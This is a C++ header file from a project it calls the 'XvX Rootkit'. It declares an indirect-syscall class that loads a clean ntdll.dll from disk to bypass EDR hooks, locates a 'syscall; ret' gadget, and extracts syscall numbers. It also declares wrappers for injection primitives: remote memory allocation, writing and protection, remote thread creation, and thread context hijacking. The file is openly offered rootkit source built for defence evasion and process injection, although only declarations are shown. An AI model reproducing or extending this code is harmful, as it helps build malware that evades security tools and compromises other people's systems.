// XvX Rootkit - Indirect Syscalls (EDR hook bypass via direct NT syscalls)
// Copyright (c) 2025 - 28zaakypro@proton.me

#ifndef INDIRECT_SYSCALLS_H
#define INDIRECT_SYSCALLS_H

#include <windows.h>

// NT Status codes
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

// Global state tracking for indirect syscall execution
typedef struct _SYSCALL_STATE {
    PVOID FreshNtdll;           // Clean ntdll.dll loaded from disk
    DWORD NtdllSize;            // Size of mapped ntdll
    PVOID SyscallGadget;        // Address of "syscall; ret" gadget
    BOOL Initialized;           // Initialization flag
} SYSCALL_STATE;

// Dynamic syscall number table extracted from ntdll.dll
typedef struct _SYSCALL_TABLE {
    DWORD NtAllocateVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtProtectVirtualMemory;
    DWORD NtCreateThreadEx;
    DWORD NtOpenProcess;
    DWORD NtQuerySystemInformation;
    DWORD NtReadVirtualMemory;
    DWORD NtClose;
    DWORD NtGetContextThread;
    DWORD NtSetContextThread;
    DWORD NtSuspendThread;
    DWORD NtResumeThread;
} SYSCALL_TABLE;

// External assembly stub for actual syscall execution (6 args)
extern "C" NTSTATUS DoSyscall(
    DWORD ssn,
    PVOID syscallGadget,
    PVOID arg1,
    PVOID arg2,
    PVOID arg3,
    PVOID arg4,
    PVOID arg5,
    PVOID arg6
);

// Core class managing indirect syscall operations
class IndirectSyscalls {
private:
    static SYSCALL_STATE g_State;
    static SYSCALL_TABLE g_SSNs;

    // Load clean ntdll copy from disk to bypass hooks
    static BOOL LoadFreshNtdll();
    // Locate syscall instruction gadget in ntdll .text section
    static PVOID FindSyscallGadget(PVOID moduleBase);
    // Resolve function address from clean ntdll export table
    static PVOID GetFunctionAddress(PVOID moduleBase, const char* functionName);
    // Extract syscall number from function stub prologue
    static DWORD ExtractSSN(PVOID functionAddress);

public:
    // Initialize indirect syscall system and extract SSNs
    static BOOL Initialize();
    // Release resources and unload fresh ntdll
    static void Cleanup();

    // Allocate memory in target process via direct syscall
    static NTSTATUS SysNtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    );

    // Write data to remote process memory via direct syscall
    static NTSTATUS SysNtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T NumberOfBytesToWrite,
        PSIZE_T NumberOfBytesWritten
    );

    // Modify memory protection flags via direct syscall
    static NTSTATUS SysNtProtectVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T NumberOfBytesToProtect,
        ULONG NewAccessProtection,
        PULONG OldAccessProtection
    );

    // Create remote thread in target process via direct syscall
    static NTSTATUS SysNtCreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList
    );

    // Open process handle with specified access rights
    static NTSTATUS SysNtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes,
        PVOID ClientId
    );

    // Read memory from remote process via direct syscall
    static NTSTATUS SysNtReadVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T NumberOfBytesToRead,
        PSIZE_T NumberOfBytesRead
    );

    // Query system information via direct syscall
    static NTSTATUS SysNtQuerySystemInformation(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );

    // Close handle via direct syscall
    static NTSTATUS SysNtClose(HANDLE Handle);

    // Retrieve thread context for suspension/hijacking scenarios
    static NTSTATUS SysNtGetContextThread(
        HANDLE ThreadHandle,
        PCONTEXT ThreadContext
    );

    // Modify thread context for APC injection or hijacking
    static NTSTATUS SysNtSetContextThread(
        HANDLE ThreadHandle,
        PCONTEXT ThreadContext
    );

    // Suspend thread execution for safe context manipulation
    static NTSTATUS SysNtSuspendThread(
        HANDLE ThreadHandle,
        PULONG PreviousSuspendCount
    );

    // Resume thread execution after context modification
    static NTSTATUS SysNtResumeThread(
        HANDLE ThreadHandle,
        PULONG PreviousSuspendCount
    );

    // Verify indirect syscall system initialization status
    static BOOL IsInitialized() { return g_State.Initialized; }
};

#endif // INDIRECT_SYSCALLS_H
